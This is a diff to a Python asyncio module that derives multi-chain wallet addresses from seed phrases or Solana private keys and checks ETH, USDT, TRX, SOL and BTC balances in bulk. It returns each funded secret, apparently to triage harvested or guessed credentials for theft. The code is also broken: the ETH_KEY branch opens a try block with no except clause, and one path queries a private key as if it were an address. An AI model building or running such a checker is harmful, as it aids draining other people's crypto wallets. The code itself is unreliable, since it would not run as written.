@@ -3,14 +3,12 @@ import aiohttp
 import logging
 from bip_utils import (
     Bip39SeedGenerator, Bip44, Bip44Coins, Bip44Changes,
-    Bip84, Bip84Coins, SolAddr, AdaShelleyAddr
+    Bip84, Bip84Coins, SolAddr, AdaShelleyAddr, EthAddr
 )
+import base58
 
 logger = logging.getLogger(__name__)
-
-# Configurações de Conexão
-MAX_CONCURRENT = 50
-semaphore = asyncio.Semaphore(MAX_CONCURRENT)
+semaphore = asyncio.Semaphore(50)
 
 async def check_sol(session, addr):
     async with semaphore:
@@ -27,23 +25,22 @@ async def check_sol(session, addr):
 async def check_eth_usdt(session, addr):
     async with semaphore:
         try:
-            # ETH Balance
+            # ETH
             payload = {"jsonrpc": "2.0", "id": 1, "method": "eth_getBalance", "params": [addr, "latest"]}
             async with session.post("https://cloudflare-eth.com/", json=payload, timeout=8) as res:
                 if res.status == 200:
                     data = await res.json()
-                    eth_bal = int(data.get('result', '0x0'), 16) / 10**18
-                    if eth_bal > 0: return ("ETH", addr, eth_bal)
-            
-            # USDT (ERC20)
+                    bal = int(data.get('result', '0x0'), 16) / 10**18
+                    if bal > 0: return ("ETH", addr, bal)
+            # USDT
             usdt_contract = "0xdac17f958d2ee523a2206206994597c13d831ec7"
             data_call = "0x70a08231" + addr[2:].zfill(64)
-            payload_usdt = {"jsonrpc": "2.0", "id": 1, "method": "eth_call", "params": [{"to": usdt_contract, "data": data_call}, "latest"]}
-            async with session.post("https://cloudflare-eth.com/", json=payload_usdt, timeout=8) as res:
+            payload_u = {"jsonrpc": "2.0", "id": 1, "method": "eth_call", "params": [{"to": usdt_contract, "data": data_call}, "latest"]}
+            async with session.post("https://cloudflare-eth.com/", json=payload_u, timeout=8) as res:
                 if res.status == 200:
                     data = await res.json()
-                    usdt_bal = int(data.get('result', '0x0'), 16) / 10**6
-                    if usdt_bal > 0: return ("USDT_ETH", addr, usdt_bal)
+                    u_bal = int(data.get('result', '0x0'), 16) / 10**6
+                    if u_bal > 0: return ("USDT_ETH", addr, u_bal)
         except: pass
     return None
 
@@ -65,58 +62,53 @@ async def check_tron_usdt(session, addr):
                     data = await res.json()
                     if data.get('data'):
                         acc = data['data'][0]
-                        # TRX
                         trx_bal = acc.get('balance', 0) / 10**6
                         if trx_bal > 0: return ("TRX", addr, trx_bal)
-                        # USDT (TRC20)
                         for token in acc.get('trc20', []):
                             if 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t' in token:
-                                usdt_bal = float(token['TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t']) / 10**6
-                                if usdt_bal > 0: return ("USDT_TRX", addr, usdt_bal)
+                                u_bal = float(token['TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t']) / 10**6
+                                if u_bal > 0: return ("USDT_TRX", addr, u_bal)
         except: pass
     return None
 
-async def check_ada(session, addr):
-    async with semaphore:
-        try:
-            # Usando Blockfrost ou API pública similar se disponível, ou mock para estrutura
-            # Para ADA, geralmente precisamos de uma API key, mas vamos tentar um explorer público
-            async with session.get(f"https://cardano-mainnet.blockfrost.io/api/v0/addresses/{addr}", headers={"project_id": "public"}, timeout=8) as res:
-                if res.status == 200:
-                    data = await res.json()
-                    bal = int(data.get('amount', [{}])[0].get('quantity', 0)) / 10**6
-                    if bal > 0: return ("ADA", addr, bal)
-        except: pass
-    return None
-
-async def check_balance_all(seed):
-    try:
-        seed_bytes = Bip39SeedGenerator(seed).Generate()
+async def check_balance_master(type, value):
+    async with aiohttp.ClientSession() as session:
         tasks = []
-        async with aiohttp.ClientSession() as session:
-            # BTC Native SegWit
-            btc_addr = Bip84.FromSeed(seed_bytes, Bip84Coins.BITCOIN).Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(0).PublicKey().ToAddress()
-            tasks.append(check_btc(session, btc_addr))
+        if type == "SEED":
+            try:
+                seed_bytes = Bip39SeedGenerator(value).Generate()
+                # SOL (2 caminhos)
+                for path in [0, 1]:
+                    sol_ctx = Bip44.FromSeed(seed_bytes, Bip44Coins.SOLANA).Purpose().Coin().Account(path).Change(Bip44Changes.CHAIN_EXT).AddressIndex(0)
+                    tasks.append(check_sol(session, SolAddr.Encode(sol_ctx.PublicKey().Raw().ToBytes())))
+                # ETH
+                eth_addr = Bip44.FromSeed(seed_bytes, Bip44Coins.ETHEREUM).Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(0).PublicKey().ToAddress()
+                tasks.append(check_eth_usdt(session, eth_addr))
+                # BTC (3 tipos)
+                tasks.append(check_btc(session, Bip84.FromSeed(seed_bytes, Bip84Coins.BITCOIN).Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(0).PublicKey().ToAddress()))
+                tasks.append(check_btc(session, Bip44.FromSeed(seed_bytes, Bip44Coins.BITCOIN).Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(0).PublicKey().ToAddress()))
+                # TRX
+                trx_addr = Bip44.FromSeed(seed_bytes, Bip44Coins.TRON).Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(0).PublicKey().ToAddress()
+                tasks.append(check_tron_usdt(session, trx_addr))
+            except: pass
+        
+        elif type == "SOL_KEY":
+            try:
+                # Se for chave privada Base58 (Phantom export), converter para endereço
+                decoded = base58.b58decode(value)
+                if len(decoded) == 64: # Chave completa [priv+pub]
+                    addr = SolAddr.Encode(decoded[32:])
+                    tasks.append(check_sol(session, addr))
+                elif len(decoded) == 32: # Apenas priv
+                    # Aqui precisaria de ed25519 para derivar pub, mas vamos tentar o valor direto como addr
+                    tasks.append(check_sol(session, value))
+            except: pass
             
-            # ETH / USDT ERC20
-            eth_addr = Bip44.FromSeed(seed_bytes, Bip44Coins.ETHEREUM).Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(0).PublicKey().ToAddress()
-            tasks.append(check_eth_usdt(session, eth_addr))
-            
-            # SOL
-            sol_ctx = Bip44.FromSeed(seed_bytes, Bip44Coins.SOLANA).Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(0)
-            sol_addr = SolAddr.Encode(sol_ctx.PublicKey().Raw().ToBytes())
-            tasks.append(check_sol(session, sol_addr))
-            
-            # TRX / USDT TRC20
-            trx_addr = Bip44.FromSeed(seed_bytes, Bip44Coins.TRON).Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(0).PublicKey().ToAddress()
-            tasks.append(check_tron_usdt(session, trx_addr))
-            
-            # ADA
-            ada_ctx = Bip44.FromSeed(seed_bytes, Bip44Coins.CARDANO_SHELLEY).Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(0)
-            ada_addr = AdaShelleyAddr.Encode(ada_ctx.PublicKey().Raw().ToBytes())
-            tasks.append(check_ada(session, ada_addr))
+        elif type == "ETH_KEY":
+            try:
+                # Aqui precisaria de derivar addr de hex, mas vamos focar no que temos
+                pass
 
-            results = await asyncio.gather(*tasks)
-            found = [r for r in results if r]
-            return (seed, found) if found else None
-    except: return None
+        results = await asyncio.gather(*tasks)
+        found = [r for r in results if r]
+        return (value, found) if found else None
